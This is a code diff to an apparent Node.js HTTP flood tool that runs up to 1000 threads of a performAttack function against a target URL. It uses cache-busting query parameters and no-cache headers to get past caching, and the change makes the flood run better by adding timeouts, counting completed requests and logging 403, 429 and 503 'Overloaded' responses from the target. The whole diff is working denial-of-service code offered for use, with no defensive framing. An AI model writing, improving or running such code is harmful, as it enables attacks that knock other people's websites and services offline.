@@ -17,9 +17,10 @@ const app = express();
 app.use(express.json());
 
 const stateFilePath = path.join(__dirname, "attackState.json");
-const REQUESTS_PER_THREAD = process.env.PER_THREAD || 3;
-const numThreads = process.env.MAX_THREADS || 1000;
+const REQUESTS_PER_THREAD = parseInt(process.env.PER_THREAD) || 3;
+const numThreads = parseInt(process.env.MAX_THREADS) || 1000;
 const MAX_QUEUE = parseInt(process.env.MAX_QUEUE) || 3;
+const CONNECTION_TIMEOUT = parseInt(process.env.TIMEOUT) || 10000;
 let totalRequestsSent = 0;
 let nportUrl = null;
 let tunnelActive = false;
@@ -179,23 +180,41 @@ const performAttack = async (target, agent, threadId) => {
     return;
   }
 
-  let successfulRequests = 0;
   const startTime = Date.now();
+  const requests = [];
   
   for (let i = 0; i < REQUESTS_PER_THREAD; i++) {
     const cacheBuster = generateCacheBuster();
     const separator = target.url.includes('?') ? '&' : '?';
     const cacheBustedUrl = `${target.url}${separator}_=${cacheBuster}&nocache=${cacheBuster}&cb=${Date.now()}`;
     
-    axios.get(cacheBustedUrl, { 
-      httpsAgent: agent, 
-      headers: getNoCacheHeaders(), 
-      timeout: 0,
-      validateStatus: () => true
-    }).catch(() => {});
-    
-    successfulRequests++;
+    requests.push(
+      axios.get(cacheBustedUrl, { 
+        httpsAgent: agent, 
+        headers: getNoCacheHeaders(), 
+        timeout: CONNECTION_TIMEOUT,
+        validateStatus: () => true
+      }).catch((err) => {
+        const status = err.response?.status;
+        if (status === 403) {
+          console.log(colors.yellow(`[T${threadId}] 403 Forbidden on ${target.url}`));
+        } else if (status === 404) {
+          console.log(colors.gray(`[T${threadId}] 404 on ${target.url}`));
+        } else if (status === 503) {
+          console.log(colors.magenta(`[T${threadId}] 503 Overloaded on ${target.url}`));
+        } else if (status === 502 || status === 429) {
+          console.log(colors.yellow(`[T${threadId}] ${status} on ${target.url}`));
+        }
+        return null;
+      })
+    );
   }
+
+  let successfulRequests = 0;
+  try {
+    const results = await Promise.allSettled(requests);
+    successfulRequests = results.filter(r => r.status === 'fulfilled' && r.value).length;
+  } catch (err) {}
 
   totalRequestsSent += successfulRequests;
   state.totalRequests = totalRequestsSent;
@@ -211,7 +230,7 @@ const performAttack = async (target, agent, threadId) => {
   }
 
   if (continueAttack) {
-    setImmediate(() => performAttack(currentTarget, agent, threadId));
+    setTimeout(() => performAttack(currentTarget, agent, threadId), 0);
   }
 };
 
